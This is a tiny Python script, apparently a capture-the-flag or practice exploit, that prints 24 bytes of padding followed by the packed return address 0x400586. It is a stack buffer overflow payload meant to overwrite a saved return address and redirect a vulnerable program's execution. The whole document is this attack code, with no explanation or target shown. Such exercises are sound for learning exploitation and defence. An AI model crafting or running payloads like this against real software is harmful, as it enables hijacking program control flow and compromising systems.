#!/usr/bin/python
import sys
import struct
sys.stdout.write("1"*(16+8))

sys.stdout.write(struct.pack("@I", 0x400586))

